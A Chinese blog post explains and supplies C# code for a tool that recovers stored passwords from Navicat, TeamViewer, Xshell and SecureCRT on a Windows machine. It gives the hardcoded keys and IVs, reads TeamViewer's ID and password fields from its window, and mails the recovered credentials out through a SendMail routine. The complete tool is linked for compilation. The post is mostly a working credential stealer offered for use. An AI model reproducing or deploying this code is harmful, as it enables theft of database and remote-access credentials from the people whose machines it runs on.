<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/wh4am1/p/12898112.html)

在编写之前我需要介绍该插件的几个详细功能。

### 一、Navicat 密码获取[#](#1179340772)

Navicat 密码是经过 Blowfish 算法加密后将密文存放在注册表中

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200515085701801-701469551.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200515085701801-701469551.png)

 获取 Navicat 密码就得先介绍 Blowfish 算法：

　　BlowFish 算法用来加密 64Bit 长度的字符串。

　　BlowFish 算法使用两个 “盒”——ungignedlongpbox[18] 和 unsignedlongsbox[4,256]。

　　BlowFish 算法中，有一个核心加密函数: BF_En(后文详细介绍）。该函数输入 64 位信息，运算后，以 64 位密文的形式输出。

而 Navicat 加密密码一般有如下几个步骤：

1. 生成密匙

在 Navicat11 中是使用 SHA-1 算法生成 160 位密钥，对 “3DC5CA39” 取其 SHA-1 摘要

```
byte[] Key = {
    0x42, 0xCE, 0xB2, 0x71, 0xA5, 0xE4, 0x58, 0xB7, 0x4A, 0xEA, 0x93, 0x94,
    0x79, 0x22, 0x35, 0x43, 0x91, 0x87, 0x33, 0x40
};
```

这样便得到 BlowFish 算法中的密匙。

2. 获得 IV 初始向量

之前介绍过 Blowfish 加密是 64Bit 长度的字符串，也就是 8 个字节，所以 Navicat 用 0xFF 填充一个 8 字节长的块，然后利用上面提到的 Key 进行 Blowfish 加密，得到 8 字节长的初始向量（IV）

IV 大致如下：

```
byte[] IV = {
    0xD9, 0xC7, 0xC3, 0xC8, 0x87, 0x0D, 0x64, 0xBD
};
```

3. 加密原始密码

Navicat 使用管道来加密 rawPass 字符串。管道如下所示：

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514102547828-578884838.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514102547828-578884838.png)

 只有当最后一个明文块不是 8 字节长时，才能执行上图中显示的最后一步。

而在 Navicat12 中，加密算法采用的是 AES128/CBC/PKCS7

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514103438784-658935371.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514103438784-658935371.png)

 而 key 和 IV 是

```
AesServiceProvider.Key = Encoding.UTF8.GetBytes("libcckeylibcckey");
AesServiceProvider.IV = Encoding.UTF8.GetBytes("libcciv libcciv ");
```

我用 HyperSine 研究员现成的代码来改进：[https://github.com/HyperSine/how-does-navicat-encrypt-password/tree/master/csharp](https://github.com/HyperSine/how-does-navicat-encrypt-password/tree/master/csharp)

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514183137841-1280685896.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514183137841-1280685896.png)

 Navicat 的解密大致如上图所示，我在代码中添加了一个发件功能

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514183331082-1101861161.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514183331082-1101861161.png)

 运行成果：

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514183439218-227517963.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514183439218-227517963.png)

### 二、TeamView 密码获取[#](#1216435147)

获取的方法没有别的，只能读取句柄，然后枚举指定父窗口的子窗口的字符串

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514190528193-516590132.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200514190528193-516590132.png)

 代码如下：

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
public static void TeamViewPwd() {
            IntPtr intPtr = FindWindow(null, "TeamViewer");
            if (intPtr == IntPtr.Zero)
            {
                Console.WriteLine("没找到TeamViewer进程或使用了修改版本");
                return;
            }
            EnumChildProc enumFunc = EnumFunc;
            EnumChildWindows(intPtr, enumFunc, IntPtr.Zero);
            foreach (WindowInfo wnd in wndList)
            {
                if (!string.IsNullOrEmpty(wnd.szWindowName))
                {
                    if (wnd.szWindowName.Equals("您的ID") || wnd.szWindowName.Equals("密码") || wnd.szWindowName.Equals("Your ID") || wnd.szWindowName.Equals("Password"))
                    {
                        int index = wndList.IndexOf(wnd);
                        Console.WriteLine(wnd.szWindowName + ":" + wndList[index + 1].szWindowName);
                    }
                }
            }
        }

        public static bool EnumFunc(IntPtr hWnd, IntPtr lParam)
        {
            StringBuilder stringBuilder = new StringBuilder(256);
            GetClassNameW(hWnd, stringBuilder, stringBuilder.Capacity);
            if (stringBuilder.ToString() == "Edit" || stringBuilder.ToString() == "Static")
            {
                WindowInfo item = default(WindowInfo);
                item.hWnd = hWnd;
                item.szClassName = stringBuilder.ToString();
                if (item.szClassName == "Edit")
                {
                    StringBuilder stringBuilder2 = new StringBuilder(256);
                    SendMessage(hWnd, 13, 256, stringBuilder2);
                    item.szWindowName = stringBuilder2.ToString();
                }
                else
                {
                    GetWindowTextW(hWnd, stringBuilder, stringBuilder.Capacity);
                    item.szWindowName = stringBuilder.ToString();
                }
                wndList.Add(item);
            }
            return true;
        }
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

### 三、Xshell 产品密码获取[#](#2701233480)

Xmanager 官方给出在 5.1 版本之后，使用的是 RC4 和 SHA256

```
Xshell uses RC4 with SHA256
```

*   Xshell < 5.1 版本

Xshell <5.1 版本采用以字符串 “!X@s#h$e%l^l&” 的 MD5 摘要作为作为 RC4 加密算法中的密钥，而 Xftp 则是以 “!X@s#c$e%l^l&” 的 MD5 作为密匙

*   Xshell = 5.1 和 5.2 版本

以当前的用户账户的 SID 的 SHA256 摘要分为 32 字节的数组作为密钥，进行 RC4 加密

可以通过 "whoami /user" 命令查看当前账户 SID

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200515115628710-1660591047.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200515115628710-1660591047.png)

则该 SID 的 SHA256 摘要就是：  

```
87842e5d2b6a2dbb4272d15c63732ddb76b282dc1f6237341bd0bf4745c854f4
```

*   Xshell > 5.2 版本

5.2 之后的版本采用的是 “user+SID” 的组合

则明文是

```
DELLS-1-5-21-146989610-2346324170-1142363407-1002
```

如果 5.1 版本之后设置了 Master Key 主密码的情况下，则以主密码的 SHA-256 摘要作为 RC4 加密中使用的密钥

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200515160333212-1780500654.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200515160333212-1780500654.png)

 但是有个重要的原因，就是域用户的 SID 和工作组的 SID 不同，导致加密所使用的 Key 不同。

这里我请了 @PpBibo 帮我测试了下环境

给出的解决方案是：获取创建该 Session 会话文件的用户，以及对应用户的 SID

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200516103210745-1823863016.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200516103210745-1823863016.png)

 运行后结果如图：

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200516111350348-1784028670.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200516111350348-1784028670.png)

 如果 session 是使用的私钥，则会解密为 "null"

虽然能够成功输出了，但是还有一个重点问题没有解决！那就是除了 Session 在默认路径下，极个别的 Xshell 的 Session 目录是在安装目录的 \ log\Xshell\Sessions 路径下

默认路径：

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200516112019168-372941645.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200516112019168-372941645.png)

 以我的本地为例，我的 Session 路径是：D:\Program Files\Xshell 6\log\Xshell\Sessions

解决方案：

虽然有点迂回，但应该是比较好的解决方案了。因为 Xshell 安装的时候会默认在 Start Menu 目录添加快捷方式：C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Xshell 6\

[![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200516113401910-806773700.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200516113401910-806773700.png)

 所以我们只需要读取该 lnk 文件的起始位置，再加上我们的相对路径，就能知道目标机器上的 Session 存放路径

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
public static string getlnk()
{
    IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
    IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Xshell 6\Xagent.lnk");
    return shortcut.TargetPath.Replace("Xagent.exe", "");
}
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

 [![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200525154633577-1577773517.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200525154633577-1577773517.png)

 有了路径之后跟上述思路一样，读取目录中的 xsh 文件

### 四、 SecureCRT 密码获取[#](#1237783289)

 首先 SecureCRT 的秘密跟 Xshell 的一样，默认将路径存放在 %APPDATA%\VanDyke\Config\Sessions \ 路径下。而在 SecureCRT 7.3.3 版本以下，存放位 "Password" 字段，而在 7.3.3 以上则存放为 "Password V2" 字段。

 [![](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200525223317776-1320964191.png)](https://img2020.cnblogs.com/blog/1124287/202005/1124287-20200525223317776-1320964191.png)

当然，在不同的字段中也有着不同的加解密算法

*   Password 字段

该字段中使用的是两个 Blowfish-CBC 密码：cipher1 和 cipher2

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
//cipher1
uint8_t Key1[16] = {
    0x24, 0xa6, 0x3d, 0xde, 0x5b, 0xd3, 0xb3, 0x82, 
    0x9c, 0x7e, 0x06, 0xf4, 0x08, 0x16, 0xaa, 0x07
}

//cipher2
uint8_t Key2[16] = {
    0x5f, 0xb0, 0x45, 0xa2, 0x94, 0x17, 0xd9, 0x16, 
    0xc6, 0xc6, 0xa2, 0xff, 0x06, 0x41, 0x82, 0xb7
}
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

而两个 cipher 所使用的 IV 都是：

```
uint8_t IV[8] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
}
```

 再附上 GitHub-[https://github.com/HyperSine/how-does-SecureCRT-encrypt-password](https://github.com/HyperSine/how-does-SecureCRT-encrypt-password) 上的解密原理图：

[![](https://img2020.cnblogs.com/blog/1124287/202008/1124287-20200825162957989-1635147608.png)](https://img2020.cnblogs.com/blog/1124287/202008/1124287-20200825162957989-1635147608.png)

这里原本是想拿上面 Navicat 的 BlowFish 现成的代码来写，发现好像有点问题 (BlowFish 加密原理是真整不明白~~) 就在网上搜了一串开源的库类，我在项目中命名为 BlowFishC

 照着流程图的来先解密 Key1 去头尾 4 字节再 Key2

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
public static string PasswordCRT(String str) {
            byte[] ciphered_bytes = fromhex(str);
            if (ciphered_bytes.Length <= 8) {
                return null;
            }

            BlowFishC algo = new BlowFishC(Key1);
            algo.IV = IV;
            byte[] decryptedTxt = algo.Decrypt_CBC(ciphered_bytes);
            decryptedTxt = decryptedTxt.Skip(4).Take(decryptedTxt.Length - 8).ToArray();

            algo = new BlowFishC(Key2);
            algo.IV = IV;
            ciphered_bytes = algo.Decrypt_CBC(decryptedTxt);
            string ciphered = Findnull(ciphered_bytes);
            
            return ciphered;
}
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

 解密完后去掉 null 字符串

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
private static string Findnull(byte[] dec) {
            List<byte> ret = new List<byte>();
            string str = "";
            for (int i=0; i < dec.Length; i++)
            {
                if (dec[i] == 0) {
                    if (dec[i+1] == 0) {
                        i++;
                        continue;
                    }
                }
                str += (char)dec[i];
                ret.Add(dec[i]);
            }
            byte[] test = ret.Where(x => x != 0).ToArray();
            return System.Text.Encoding.Default.GetString(test);
        }
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

 找到字段密码：

```
S:"Password"=uac230fec9ceb3a23f1df712c51c556f19264e68dc544acfc　　//root
```

 [![](https://img2020.cnblogs.com/blog/1124287/202008/1124287-20200826000148176-204375461.png)](https://img2020.cnblogs.com/blog/1124287/202008/1124287-20200826000148176-204375461.png)

 虽然有些乱码，但不妨碍破解正常密码

*   Password V2 字段

这个字段我觉得可能是 Key 值不对，我用这个 Key 加密之后的密文'6029dd61ef0e2358e522d8d4037f8cf3'能够解密成功。但是用 CRT 的密文就提示 “填充无效，无法被移除”

我还是贴上实现代码吧~

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
private static byte[] Key_V2 = { 0xe3, 0xb0, 0xc4, 0x42, 0x98, 0xfc, 0x1c, 0x14, 0x9a, 0xfb, 0xf4, 0xc8, 0x99, 0x6f, 0xb9, 0x24, 0x27, 0xae, 0x41, 0xe4, 0x64, 0x9b, 0x93, 0x4c, 0xa4, 0x95, 0x99, 0x1b, 0x78, 0x52, 0xb8, 0x55 };

public static string V2CRT(string str) {
    byte[] IV = { 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    byte[] ciphered_bytes = fromhex(str);
    if (ciphered_bytes.Length <= 8)
    {
        return null;
    }
    return AESDecrypt(Convert.ToBase64String(ciphered_bytes), Key_V2);
}

private static string AESDecrypt(string decryptStr, byte[] key)
{
    var _aes = new AesCryptoServiceProvider();
    _aes.BlockSize = 128;
    _aes.KeySize = 256;
    _aes.Key = key;
    _aes.IV = (byte[])(object)new sbyte[16];//Encoding.UTF8.GetBytes(IV);
    _aes.Padding = PaddingMode.PKCS7;
    _aes.Mode = CipherMode.CBC;

    byte[] decryptBytes = System.Convert.FromBase64String(decryptStr);

    var _crypto = _aes.CreateDecryptor(_aes.Key, _aes.IV);
    byte[] decrypted = _crypto.TransformFinalBlock(decryptBytes, 0, decryptBytes.Length);
    _crypto.Dispose();
    return Encoding.UTF8.GetString(decrypted);
    
}
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

V2 字段没什么好说的，没有复现成功，但是解密原理应该没有错，可能是密匙 Key 不对了。

如下调用就行：

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
public static void SecureCRTPwd() {
    StringBuilder strbuf = new StringBuilder();

    strbuf.Append("[*] Password:" + SecureCRTCipher.PasswordCRT("ac230fec9ceb3a23f1df712c51c556f19264e68dc544acfc"));
    strbuf.Append(Environment.NewLine);
    strbuf.Append("[*] Password V2:" + SecureCRTCipher.V2CRT("6029dd61ef0e2358e522d8d4037f8cf3"));
    strbuf.Append(Environment.NewLine);

    SendMail.Send(strbuf);
}
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

[![](https://img2020.cnblogs.com/blog/1124287/202008/1124287-20200826150231523-977928873.png)](https://img2020.cnblogs.com/blog/1124287/202008/1124287-20200826150231523-977928873.png)

代码我就直接上传到 Github 上：[https://github.com/sf197/GetPwd](https://github.com/sf197/GetPwd)

需要的自行编译~

Reference：

[1].[https://www.cnblogs.com/luconsole/articles/3895295.html](https://www.cnblogs.com/luconsole/articles/3895295.html)

[2].[https://github.com/HyperSine/how-does-SecureCRT-encrypt-password](https://github.com/HyperSine/how-does-SecureCRT-encrypt-password)

[3].[https://www.cnblogs.com/mycing/p/8277693.html](https://www.cnblogs.com/mycing/p/8277693.html)